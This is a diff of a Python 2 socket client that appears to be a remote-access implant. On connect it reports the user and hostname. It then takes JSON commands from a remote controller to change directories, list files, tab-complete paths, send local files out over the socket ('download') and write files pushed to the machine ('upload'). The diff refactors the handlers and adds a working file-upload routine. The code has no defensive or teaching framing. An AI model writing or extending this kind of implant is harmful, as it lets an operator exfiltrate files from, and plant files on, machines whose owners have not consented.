@@ -15,22 +15,29 @@ username = getpass.getuser()
 sock.send(username + "@" + socket.gethostname())
 
 
-def change_dir(path):
-	if not path:
-		os.chdir(home)
-	elif os.path.exists(path) == False:
-		sock.send(path + ": No such file or directory")
-	else:
-		os.chdir(path)
-	sock.send(term)
+def change_dir(cmd_data):
+	path = cmd_data['args']
+	try:
+		if not path:
+			os.chdir(home)
+		elif os.path.exists(path) == False:
+			sock.send(path + ": No such file or directory")
+		elif os.path.isdir(path) == False:
+			sock.send(path + ": Is a file")
+		else:
+			os.chdir(path)
+	except Exception as e:
+		sock.send(str(e))
+	sock.send(cmd_data['term'])
 
 
-def pwd():
+def pwd(cmd_data):
 	sock.send(os.getcwd())
-	sock.send(term)	
+	sock.send(cmd_data['term'])	
 
 
-def list_dir(path):
+def list_dir(cmd_data):
+	path = cmd_data['args']
 	results = dict()
 	if not path:
 		path = "."
@@ -47,23 +54,26 @@ def list_dir(path):
 			sock.send(json.dumps(results))
 		except Exception as e:
 			sock.send(str(e))
-	sock.send(term)
+	sock.send(cmd_data['term'])
 
 
-def tab_complete(path):
-	global term
+def tab_complete(cmd_data):
+	path = cmd_data['args']
 	results = {}
-	for v in os.listdir(path):
-		if os.path.isdir(os.path.join(path,v)):
-			results[v] = 10
-		else:
-			results[v] = 0
+	try:
+		for v in os.listdir(path):
+			if os.path.isdir(os.path.join(path,v)):
+				results[v] = 10
+			else:
+				results[v] = 0
+	except OSError:
+		pass
 	sock.send(json.dumps(results))
-	sock.send(term)
+	sock.send(cmd_data['term'])
 
 
-def send_file(path):
-	global term
+def send_file(cmd_data):
+	path = cmd_data['args']
 	if os.path.exists(path):
 		if os.path.isdir(path):
 			sock.send(json.dumps({"status":2}))
@@ -71,7 +81,7 @@ def send_file(path):
 			f = open(path,"rb")
 			data = f.read()
 			sock.send(json.dumps({"status":1,"size":len(data)}))
-			sock.send(term)
+			sock.send(cmd_data['term'])
 			term = sock.recv(10)
 			print "sending data"
 			sock.send(data)
@@ -79,36 +89,44 @@ def send_file(path):
 			return
 	else:
 		sock.send(json.dumps({"status":0}))
-	sock.send(term)
+	sock.send(cmd_data['term'])
 
 
-def receive_file(args):
-	global term
-	print "fuck yeah"
-	sock.send(term)
+def receive_file(cmd_data):
+	term = cmd_data['term']
+	extra_args = json.loads(cmd_data['args'])
+	print extra_args
+	size = int(extra_args['size'])
+	file_path = extra_args['path']
+	file_name = extra_args['filename']
+	f = open(os.path.join(file_path,file_name),'a')
+	while 1:
+		chunk = sock.recv(128)
+		if str(chunk) == str(term):
+			break
+		f.write(chunk)
 
 
 # SETUP
 while 1:
-	global term
-	cmd_data = json.loads(sock.recv(128))
+	raw_data = sock.recv(512)
+	print raw_data
+	cmd_data = json.loads(raw_data)
 	cmd = cmd_data['cmd']
-	args = cmd_data['args']
-	term = cmd_data['term']
 
 	if cmd == "cd":
-		change_dir(args)
+		change_dir(cmd_data)
 	elif cmd == "ls":
-		list_dir(args)
+		list_dir(cmd_data)
 	elif cmd == "download":
-		send_file(args)
+		send_file(cmd_data)
 	elif cmd == "upload":
-		receive_file(args)
+		receive_file(cmd_data)
 	elif cmd == "tab_complete":
-		tab_complete(args)
+		tab_complete(cmd_data)
 	elif cmd == "pwd":
-		pwd()
+		pwd(cmd_data)
 	else:
 		sock.send('exec')
-		sock.send(term)
+		sock.send(cmd_data['term'])
 
